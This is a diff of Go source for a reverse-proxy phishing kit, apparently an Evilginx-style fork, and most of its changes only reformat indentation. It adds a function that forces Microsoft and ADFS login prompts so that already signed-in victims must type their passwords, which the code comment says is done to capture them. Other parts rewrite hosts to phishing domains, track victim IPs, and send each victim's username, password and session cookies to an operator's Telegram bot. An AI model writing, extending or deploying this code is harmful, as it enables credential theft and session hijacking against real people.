-    if hostname[0] == '.' {
-        prefix = "."
-        hostname = hostname[1:]
-    }
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-            if !ok {
-                continue
-            }
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-                    return prefix + combineHost(ph.orig_subdomain, ph.domain), true
-                }
-            }
-        }
-    }
-    return hostname, false
+	if hostname == "" {
+		return hostname, false
+	}
+	prefix := ""
+	if hostname[0] == '.' {
+		prefix = "."
+		hostname = hostname[1:]
+	}
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
+				}
+			}
+		}
+	}
+	return hostname, false
 }
 
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
-    if hostname == "" {
-        return hostname, false
-    }
-    prefix := ""
-    if hostname[0] == '.' {
-        prefix = "."
-        hostname = hostname[1:]
-    }
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-            if !ok {
-                continue
-            }
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-                    return prefix + combineHost(ph.phish_subdomain, phishDomain), true
-                }
-                if hostname == ph.domain {
-                    return prefix + phishDomain, true
-                }
-            }
-        }
-    }
-    return hostname, false
+	if hostname == "" {
+		return hostname, false
+	}
+	prefix := ""
+	if hostname[0] == '.' {
+		prefix = "."
+		hostname = hostname[1:]
+	}
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+				}
+				if hostname == ph.domain {
+					return prefix + phishDomain, true
+				}
+			}
+		}
+	}
+	return hostname, false
 }
 
 func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
-    r_url, err := url.Parse(u)
-    if err == nil {
-        if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
-            r_url.Host = r_host
-            return r_url.String(), true
-        }
-    }
-    return u, false
+	r_url, err := url.Parse(u)
+	if err == nil {
+		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+			r_url.Host = r_host
+			return r_url.String(), true
+		}
+	}
+	return u, false
+}
+
+// forceLoginPrompt makes the identity provider show its credential form instead
+// of silently signing the visitor back in with a session the browser already
+// holds. Without this, a victim who is already signed in land on the app and
+// never types a password, so no credentials get captured.
+//
+// OAuth endpoints get prompt=login; the SAML / WS-Fed equivalents get wfresh=0.
+// Existing values are never overwritten, so an app that asks for
+// prompt=select_account keeps its own behaviour.
+func (p *HttpProxy) forceLoginPrompt(u *url.URL) bool {
+	if u == nil || !p.cfg.IsForceLoginEnabled() {
+		return false
+	}
+	pth := strings.ToLower(u.Path)
+	q := u.Query()
+	switch {
+	case strings.Contains(pth, "/oauth2/v2.0/authorize"),
+		strings.Contains(pth, "/oauth2/authorize"),
+		strings.HasSuffix(pth, "/oauth20_authorize.srf"):
+		if q.Get("prompt") != "" {
+			return false
+		}
+		q.Set("prompt", "login")
+	case strings.Contains(pth, "/saml2"),
+		strings.Contains(pth, "/wsfed"),
+		strings.Contains(pth, "/adfs/ls"):
+		if q.Get("wfresh") != "" {
+			return false
+		}
+		q.Set("wfresh", "0")
+	default:
+		return false
+	}
+	u.RawQuery = q.Encode()
+	return true
 }
 
 func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-            if !ok {
-                continue
-            }
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-                    return phishDomain, true
-                }
-            }
-        }
-    }
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return phishDomain, true
+				}
+			}
+		}
+	}
 
-    for _, l := range p.cfg.lures {
-        if l.Hostname == hostname {
-            if p.cfg.IsSiteEnabled(l.Phishlet) {
-                phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
-                if ok {
-                    return phishDomain, true
-                }
-            }
-        }
-    }
+	for _, l := range p.cfg.lures {
+		if l.Hostname == hostname {
+			if p.cfg.IsSiteEnabled(l.Phishlet) {
+				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
+				if ok {
+					return phishDomain, true
+				}
+			}
+		}
+	}
 
-    return "", false
+	return "", false
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-            if !ok {
-                continue
-            }
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-                    return ph.phish_subdomain, true
-                }
-            }
-        }
-    }
-    return "", false
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return ph.phish_subdomain, true
+				}
+			}
+		}
+	}
+	return "", false
 }
 
 func (p *HttpProxy) handleSession(hostname string) bool {
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-            if !ok {
-                continue
-            }
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-                    return true
-                }
-            }
-        }
-    }
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return true
+				}
+			}
+		}
+	}
 
-    for _, l := range p.cfg.lures {
-        if l.Hostname == hostname {
-            if p.cfg.IsSiteEnabled(l.Phishlet) {
-                return true
-            }
-        }
-    }
+	for _, l := range p.cfg.lures {
+		if l.Hostname == hostname {
+			if p.cfg.IsSiteEnabled(l.Phishlet) {
+				return true
+			}
+		}
+	}
 
-    return false
+	return false
 }
 
 func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
-    if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
-        head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
-        var og_inject string
-        og_format := "<meta property=\"%s\" content=\"%s\" />\n"
-        if l.OgTitle != "" {
-            og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
-        }
-        if l.OgDescription != "" {
-            og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
-        }
-        if l.OgImageUrl != "" {
-            og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
-        }
-        if l.OgUrl != "" {
-            og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
-        }
+	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
+		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
+		var og_inject string
+		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
+		if l.OgTitle != "" {
+			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
+		}
+		if l.OgDescription != "" {
+			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
+		}
+		if l.OgImageUrl != "" {
+			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
+		}
+		if l.OgUrl != "" {
+			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
+		}
 
-        body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
-    }
-    return body
+		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
+	}
+	return body
 }
 
 // singleConnListener is a net.Listener that yields exactly one connection then
 // blocks Accept() until Close() is called (triggered by http.Server ConnState).
 type singleConnListener struct {
-    conn   net.Conn
-    accept chan net.Conn
-    mu     sync.Mutex
-    closed bool
+	conn   net.Conn
+	accept chan net.Conn
+	mu     sync.Mutex
+	closed bool
 }
 
 func newSingleConnListener(conn net.Conn) *singleConnListener {
-    ch := make(chan net.Conn, 1)
-    ch <- conn
-    return &singleConnListener{conn: conn, accept: ch}
+	ch := make(chan net.Conn, 1)
+	ch <- conn
+	return &singleConnListener{conn: conn, accept: ch}
 }
 
 func (l *singleConnListener) Accept() (net.Conn, error) {
-    c, ok := <-l.accept
-    if !ok {
-        return nil, net.ErrClosed
-    }
-    return c, nil
+	c, ok := <-l.accept
+	if !ok {
+		return nil, net.ErrClosed
+	}
+	return c, nil
 }
 
 func (l *singleConnListener) Close() error {
-    l.mu.Lock()
-    defer l.mu.Unlock()
-    if !l.closed {
-        l.closed = true
-        close(l.accept)
-    }
-    return nil
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	if !l.closed {
+		l.closed = true
+		close(l.accept)
+	}
+	return nil
 }
 
 func (l *singleConnListener) Addr() net.Addr { return l.conn.RemoteAddr() }
@@ -2591,79 +2634,79 @@ func (l *singleConnListener) Addr() net.Addr { return l.conn.RemoteAddr() }
 // hostname when the phished hostname matches the phishlet's landing phish host.
 // It handles an optional leading dot (for cookie domains).
 func (p *HttpProxy) applyLureHostname(hostname string, ps *ProxySession) string {
-    if ps == nil || ps.LureHostname == "" {
-        return hostname
-    }
-    lurePl := p.getPhishletByPhishHost(ps.LureHostname)
-    if lurePl == nil {
-        return hostname
-    }
-    landingHost := lurePl.GetLandingPhishHost()
-    prefix := ""
-    h := hostname
-    if len(h) > 0 && h[0] == '.' {
-        prefix = "."
-        h = h[1:]
-    }
-    if h == landingHost {
-        return prefix + ps.LureHostname
-    }
-    return hostname
+	if ps == nil || ps.LureHostname == "" {
+		return hostname
+	}
+	lurePl := p.getPhishletByPhishHost(ps.LureHostname)
+	if lurePl == nil {
+		return hostname
+	}
+	landingHost := lurePl.GetLandingPhishHost()
+	prefix := ""
+	h := hostname
+	if len(h) > 0 && h[0] == '.' {
+		prefix = "."
+		h = h[1:]
+	}
+	if h == landingHost {
+		return prefix + ps.LureHostname
+	}
+	return hostname
 }
 
 func (p *HttpProxy) Start() error {
-    go p.httpsWorker()
-    return nil
+	go p.httpsWorker()
+	return nil
 }
 
 // SetDashboardHandler registers an http.Handler to serve when the incoming Host
 // matches the configured dashboard subdomain.
 func (p *HttpProxy) SetDashboardHandler(h http.Handler) {
-    p.dashboardHandler = h
+	p.dashboardHandler = h
 }
 
 // SetRedirectsDir sets the directory where redirect page HTML files are stored.
 func (p *HttpProxy) SetRedirectsDir(dir string) {
-    p.redirectsDir = dir
+	p.redirectsDir = dir
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
-    p.ip_mtx.Lock()
-    defer p.ip_mtx.Unlock()
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
-    log.Debug("whitelistIP: %s %s", ip_addr, sid)
-    p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(60 * time.Minute).Unix()
-    p.ip_sids[ip_addr+"-"+pl_name] = sid
+	log.Debug("whitelistIP: %s %s", ip_addr, sid)
+	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(60 * time.Minute).Unix()
+	p.ip_sids[ip_addr+"-"+pl_name] = sid
 }
 
 // ipHasActiveSession reports whether ip_addr currently has at least one unexpired
 // whitelist/session entry (any phishlet). Used to let an in-progress victim keep
 // using the proxy even if their IP also appears on the blacklist.
 func (p *HttpProxy) ipHasActiveSession(ip_addr string) bool {
-    p.ip_mtx.Lock()
-    defer p.ip_mtx.Unlock()
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
-    ct := time.Now()
-    prefix := ip_addr + "-"
-    for key, exp := range p.ip_whitelist {
-        if strings.HasPrefix(key, prefix) && ct.Before(time.Unix(exp, 0)) {
-            return true
-        }
-    }
-    return false
+	ct := time.Now()
+	prefix := ip_addr + "-"
+	for key, exp := range p.ip_whitelist {
+		if strings.HasPrefix(key, prefix) && ct.Before(time.Unix(exp, 0)) {
+			return true
+		}
+	}
+	return false
 }
 
 func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
-    p.ip_mtx.Lock()
-    defer p.ip_mtx.Unlock()
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
-    log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
-    ct := time.Now()
-    if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
-        et := time.Unix(ip_t, 0)
-        return ct.Before(et)
-    }
-    return false
+	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
+	ct := time.Now()
+	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
+		et := time.Unix(ip_t, 0)
+		return ct.Before(et)
+	}
+	return false
 }
 
 // findWhitelistedSession returns the session ID and phishlet for the first
@@ -2671,239 +2714,239 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
 // Use this as a fallback when isWhitelistedIP fails because the wrong
 // phishlet was resolved from a shared phish subdomain.
 func (p *HttpProxy) findWhitelistedSession(ip_addr string) (string, *Phishlet) {
-    p.ip_mtx.Lock()
-    defer p.ip_mtx.Unlock()
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
-    ct := time.Now()
-    prefix := ip_addr + "-"
-    for key, exp := range p.ip_whitelist {
-        if strings.HasPrefix(key, prefix) && ct.Before(time.Unix(exp, 0)) {
-            if sid, ok := p.ip_sids[key]; ok {
-                plName := strings.TrimPrefix(key, prefix)
-                if pl, err := p.cfg.GetPhishlet(plName); err == nil {
-                    return sid, pl
-                }
-            }
-        }
-    }
-    return "", nil
+	ct := time.Now()
+	prefix := ip_addr + "-"
+	for key, exp := range p.ip_whitelist {
+		if strings.HasPrefix(key, prefix) && ct.Before(time.Unix(exp, 0)) {
+			if sid, ok := p.ip_sids[key]; ok {
+				plName := strings.TrimPrefix(key, prefix)
+				if pl, err := p.cfg.GetPhishlet(plName); err == nil {
+					return sid, pl
+				}
+			}
+		}
+	}
+	return "", nil
 }
 
 func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
-    p.ip_mtx.Lock()
-    defer p.ip_mtx.Unlock()
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
-    pl := p.getPhishletByPhishHost(hostname)
-    if pl != nil {
-        sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
-        return sid, ok
-    }
-    return "", false
+	pl := p.getPhishletByPhishHost(hostname)
+	if pl != nil {
+		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
+		return sid, ok
+	}
+	return "", false
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
-    if enabled {
-        ptypes := []string{"http", "https", "socks5", "socks5h"}
-        if !stringExists(ptype, ptypes) {
-            return fmt.Errorf("invalid proxy type selected")
-        }
-        if len(address) == 0 {
-            return fmt.Errorf("proxy address can't be empty")
-        }
-        if port == 0 {
-            return fmt.Errorf("proxy port can't be 0")
-        }
+	if enabled {
+		ptypes := []string{"http", "https", "socks5", "socks5h"}
+		if !stringExists(ptype, ptypes) {
+			return fmt.Errorf("invalid proxy type selected")
+		}
+		if len(address) == 0 {
+			return fmt.Errorf("proxy address can't be empty")
+		}
+		if port == 0 {
+			return fmt.Errorf("proxy port can't be 0")
+		}
 
-        u := url.URL{
-            Scheme: ptype,
-            Host:   address + ":" + strconv.Itoa(port),
-        }
+		u := url.URL{
+			Scheme: ptype,
+			Host:   address + ":" + strconv.Itoa(port),
+		}
 
-        if strings.HasPrefix(ptype, "http") {
-            var dproxy *http_dialer.HttpTunnel
-            if username != "" {
-                dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
-            } else {
-                dproxy = http_dialer.New(&u)
-            }
-            p.Proxy.Tr.Dial = dproxy.Dial
-        } else {
-            if username != "" {
-                u.User = url.UserPassword(username, password)
-            }
+		if strings.HasPrefix(ptype, "http") {
+			var dproxy *http_dialer.HttpTunnel
+			if username != "" {
+				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
+			} else {
+				dproxy = http_dialer.New(&u)
+			}
+			p.Proxy.Tr.Dial = dproxy.Dial
+		} else {
+			if username != "" {
+				u.User = url.UserPassword(username, password)
+			}
 
-            dproxy, err := proxy.FromURL(&u, nil)
-            if err != nil {
-                return err
-            }
-            p.Proxy.Tr.Dial = dproxy.Dial
-        }
-    } else {
-        p.Proxy.Tr.Dial = nil
-    }
-    return nil
+			dproxy, err := proxy.FromURL(&u, nil)
+			if err != nil {
+				return err
+			}
+			p.Proxy.Tr.Dial = dproxy.Dial
+		}
+	} else {
+		p.Proxy.Tr.Dial = nil
+	}
+	return nil
 }
 
 type dumbResponseWriter struct {
-    net.Conn
+	net.Conn
 }
 
 func (dumb dumbResponseWriter) Header() http.Header {
-    panic("Header() should not be called on this ResponseWriter")
+	panic("Header() should not be called on this ResponseWriter")
 }
 
 func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
-    if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
-        return len(buf), nil
-    }
-    return dumb.Conn.Write(buf)
+	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
+		return len(buf), nil
+	}
+	return dumb.Conn.Write(buf)
 }
 
 func (dumb dumbResponseWriter) WriteHeader(code int) {
-    panic("WriteHeader() should not be called on this ResponseWriter")
+	panic("WriteHeader() should not be called on this ResponseWriter")
 }
 
 func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
-    return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
+	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
 }
 
 func orPanic(err error) {
-    if err != nil {
-        panic(err)
-    }
+	if err != nil {
+		panic(err)
+	}
 }
 
 func getContentType(path string, data []byte) string {
-    switch filepath.Ext(path) {
-    case ".css":
-        return "text/css"
-    case ".js":
-        return "application/javascript"
-    case ".svg":
-        return "image/svg+xml"
-    }
-    return http.DetectContentType(data)
+	switch filepath.Ext(path) {
+	case ".css":
+		return "text/css"
+	case ".js":
+		return "application/javascript"
+	case ".svg":
+		return "image/svg+xml"
+	}
+	return http.DetectContentType(data)
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
-    hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
-    s_hash := fmt.Sprintf("%x", hash[:4])
-    return s_hash
+	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
+	s_hash := fmt.Sprintf("%x", hash[:4])
+	return s_hash
 }
 
 func obfuscateJS(originalJS string) string {
-    return originalJS
+	return originalJS
 }
 
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
-    resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-    if resp != nil {
-        redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
-        resp.Header.Add("Location", redirect_url)
-        return req, resp
-    }
-    return req, nil
+	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+	if resp != nil {
+		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+		resp.Header.Add("Location", redirect_url)
+		return req, resp
+	}
+	return req, nil
 }
 
 // rewriteSensitivePaths rewrites full phishing domain URLs in HTML responses to relative paths
 func rewriteSensitivePaths(body []byte, phishHost string) []byte {
-    bodyStr := string(body)
+	bodyStr := string(body)
 
-    httpsPrefix := "https://" + phishHost + "/"
-    bodyStr = strings.ReplaceAll(bodyStr, httpsPrefix, "/")
+	httpsPrefix := "https://" + phishHost + "/"
+	bodyStr = strings.ReplaceAll(bodyStr, httpsPrefix, "/")
 
-    protoRelative := "//" + phishHost + "/"
-    bodyStr = strings.ReplaceAll(bodyStr, protoRelative, "/")
+	protoRelative := "//" + phishHost + "/"
+	bodyStr = strings.ReplaceAll(bodyStr, protoRelative, "/")
 
-    return []byte(bodyStr)
+	return []byte(bodyStr)
 }
 
 func (p *HttpProxy) ReloadTelegramConfig() {
-    log.Info("Telegram configuration reloaded")
+	log.Info("Telegram configuration reloaded")
 }
 
 func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
-    if sid == "" {
-        return
-    }
+	if sid == "" {
+		return
+	}
 
-    botToken := p.cfg.GetTelegramBotToken()
-    chatId := p.cfg.GetTelegramChatID()
+	botToken := p.cfg.GetTelegramBotToken()
+	chatId := p.cfg.GetTelegramChatID()
 
-    if botToken == "" || chatId == "" {
-        log.Debug("Telegram: bot token or chat ID not configured, skipping notification")
-        return
-    }
+	if botToken == "" || chatId == "" {
+		log.Debug("Telegram: bot token or chat ID not configured, skipping notification")
+		return
+	}
 
-    // Wait a moment for credentials/cookies to be fully set
-    time.Sleep(2 * time.Second)
+	// Wait a moment for credentials/cookies to be fully set
+	time.Sleep(2 * time.Second)
 
-    // Read from IN-MEMORY sessions - NO database query
-    p.session_mtx.Lock()
-    s, exists := p.sessions[sid]
-    p.session_mtx.Unlock()
+	// Read from IN-MEMORY sessions - NO database query
+	p.session_mtx.Lock()
+	s, exists := p.sessions[sid]
+	p.session_mtx.Unlock()
 
-    if !exists {
-        log.Warning("Telegram: session %s not found in memory", sid)
-        return
-    }
+	if !exists {
+		log.Warning("Telegram: session %s not found in memory", sid)
+		return
+	}
 
-    p.session_mtx.Lock()
-    username := s.Username
-    password := s.Password
-    remoteAddr := s.RemoteAddr
-    userAgent := s.UserAgent
-    phishletName := s.Name
+	p.session_mtx.Lock()
+	username := s.Username
+	password := s.Password
+	remoteAddr := s.RemoteAddr
+	userAgent := s.UserAgent
+	phishletName := s.Name
 
-    // Build a TSession from the in-memory session
-    ts := TSession{
-        ID:         0,
-        Phishlet:   phishletName,
-        LandingURL: "",
-        Username:   username,
-        Password:   password,
-        SessionID:  sid,
-        UserAgent:  userAgent,
-        RemoteAddr: remoteAddr,
-        CreateTime: time.Now().Unix(),
-        UpdateTime: time.Now().Unix(),
-    }
+	// Build a TSession from the in-memory session
+	ts := TSession{
+		ID:         0,
+		Phishlet:   phishletName,
+		LandingURL: "",
+		Username:   username,
+		Password:   password,
+		SessionID:  sid,
+		UserAgent:  userAgent,
+		RemoteAddr: remoteAddr,
+		CreateTime: time.Now().Unix(),
+		UpdateTime: time.Now().Unix(),
+	}
 
-    // Copy custom fields (geo data, etc.) into TSession so Telegram sees them
-    ts.Custom = make(map[string]interface{})
-    for k, v := range s.Custom {
-        ts.Custom[k] = v
-    }
+	// Copy custom fields (geo data, etc.) into TSession so Telegram sees them
+	ts.Custom = make(map[string]interface{})
+	for k, v := range s.Custom {
+		ts.Custom[k] = v
+	}
 
-    // Convert CookieTokens to map[string]interface{} for TSession
-    ts.Tokens = make(map[string]interface{})
-    for domain, tokens := range s.CookieTokens {
-        domainTokens := make(map[string]interface{})
-        for name, token := range tokens {
-            domainTokens[name] = map[string]interface{}{
-                "Name":     token.Name,
-                "Value":    token.Value,
-                "Path":     token.Path,
-                "HttpOnly": token.HttpOnly,
-            }
-        }
-        ts.Tokens[domain] = domainTokens
-    }
+	// Convert CookieTokens to map[string]interface{} for TSession
+	ts.Tokens = make(map[string]interface{})
+	for domain, tokens := range s.CookieTokens {
+		domainTokens := make(map[string]interface{})
+		for name, token := range tokens {
+			domainTokens[name] = map[string]interface{}{
+				"Name":     token.Name,
+				"Value":    token.Value,
+				"Path":     token.Path,
+				"HttpOnly": token.HttpOnly,
+			}
+		}
+		ts.Tokens[domain] = domainTokens
+	}
 
-    cookiesForDB := s.CookieTokens
-    p.session_mtx.Unlock()
+	cookiesForDB := s.CookieTokens
+	p.session_mtx.Unlock()
 
-    // Sync in-memory cookies to DB so terminal sessions and dashboard
-    // show the same data as Telegram.
-    if len(cookiesForDB) > 0 {
-        if dbErr := p.db.SetSessionCookieTokens(sid, cookiesForDB); dbErr != nil {
-            log.Error("[telegram] db cookie sync: %v", dbErr)
-        }
-    }
+	// Sync in-memory cookies to DB so terminal sessions and dashboard
+	// show the same data as Telegram.
+	if len(cookiesForDB) > 0 {
+		if dbErr := p.db.SetSessionCookieTokens(sid, cookiesForDB); dbErr != nil {
+			log.Error("[telegram] db cookie sync: %v", dbErr)
+		}
+	}
 
-    // Use the QUEUE-BASED notification system instead of raw HTTP
-    // This properly creates formatted messages with cookie files
-    GetTelegramQueue().Enqueue(ts, chatId, botToken)
+	// Use the QUEUE-BASED notification system instead of raw HTTP
+	// This properly creates formatted messages with cookie files
+	GetTelegramQueue().Enqueue(ts, chatId, botToken)
 
-    log.Success("Telegram notification queued for session: %s", sid)
+	log.Success("Telegram notification queued for session: %s", sid)
 }
